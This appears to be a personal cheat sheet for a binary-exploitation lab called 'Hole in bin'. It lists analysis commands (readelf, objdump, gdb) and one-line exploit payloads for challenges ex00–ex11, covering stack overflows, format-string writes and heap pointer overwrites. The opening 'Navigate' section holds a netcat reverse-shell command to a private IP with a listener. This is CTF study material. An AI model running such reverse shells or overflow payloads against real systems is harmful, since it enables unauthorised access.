# Hole in bin
# Binary Analysis Commands

## Navigate

```bash

busybox nc 192.168.56.105 4444 -e /bin/bash

rlwrap nc -lvnp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash

cat README.txt
```

## Static Analysis

### Identify the Binary

```bash
file bin
```

### Check Security Protections

```bash
checksec --file=bin
```

### Extract Strings

```bash
strings bin
```

### ELF Information

```bash
readelf -h bin
readelf -l bin
readelf -S bin
readelf -s bin
```

### Shared Libraries

```bash
ldd bin
```

### Disassemble

```bash
objdump -d bin
objdump -M intel -d bin
objdump -d bin | grep "<main>"
objdump -d bin | less
```

---

# Dynamic Analysis (GDB)

### Launch GDB

```bash
gdb ./bin
```

### Inside GDB

```gdb
disassemble main
break main
run
run AAAA
continue
next
step
finish

info registers
info locals
info variables
info functions
backtrace

x/32xb $esp
x/16wx $esp
x/20i $eip
```

---

# Radare2

```bash
r2 bin
```



---

# Binary Information

```bash
ls -l
stat bin
xxd bin | head
hexdump -C bin | head
sha256sum bin
md5sum bin
```

---

# Typical Workflow

```bash

file bin
checksec --file=bin
strings bin
readelf -h bin
readelf -l bin
readelf -S bin
readelf -s bin
ldd bin

objdump -M intel -d bin

gdb ./bin
# Inside GDB:
# disassemble main
# break main
# run
# next
# step
# info registers
# x/32xb $esp

./bin
```

---

# Challenges and Exploits

### ex00 – Stack Buffer Overflow (Overwriting a Local Variable)
**Exploit Command:**
```bash
./bin
```

### ex01 – Stack Buffer Overflow (Overwriting a Variable with a Specific Value)
**Exploit Command:**
```bash
./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64+b"\x64\x63\x62\x61")')"
```

### ex02 – Stack Buffer Overflow Using an Environment Variable
**Exploit Command:**
```bash
export GREENIE=$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*64+b"\x0a\x0d\x0a\x0d")')
./bin
```

### ex03 – Stack Buffer Overflow (Overwriting a Function Pointer)
**Exploit Command:**
```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64+b"\x24\x84\x04\x08")' | ./bin
```

### ex04 – Ret2Win (Stack Buffer Overflow)
**Exploit Command:**
```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xf4\x83\x04\x08")' | ./bin
```

### ex05 – Stack Buffer Overflow (Overwriting a Local Variable)
**Exploit Command:**
```bash
./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\xef\xbe\xad\xde")')"
```

### ex06 – Calling `winner()` with GDB
**Exploit Command:**
```bash
gdb ./bin
# Inside GDB:
# break main
# run AAAA BBBB CCCC
# set $eip = 0x08048864
# continue
```

### ex07 – Format String Vulnerability
**Exploit Command:**
```bash
python -c "print('\xe4\x96\x04\x08' + 'A'*60 + '%4\$n')" | ./bin
```

### ex08 – Format String Write
**Exploit Command:**
```bash
python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52x%12$hhn%17x%13$hhn%173x%14$hhn%255x%15$hhn"' | ./bin
```

### ex09 – Format String Vulnerability (`%hn` Arbitrary Write)
**Exploit Command:**
```bash
python -c 'print "\x24\x97\x04\x08" + "%33968x%4$hn"' | ./bin
```

### ex10 – Heap Function Pointer Overwrite (Heap Overflow)
**Exploit Command:**
```bash
./bin "$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72+b"\x64\x84\x04\x08")')"
```

### ex11 – Heap Structure Pointer Overwrite (Function Pointer Hijack)
**Exploit Command:**
```bash
./bin $(python -c "print 'A'*20 + '\x74\x97\x04\x08'") $(python -c "print '\x94\x84\x04\x08'")
```
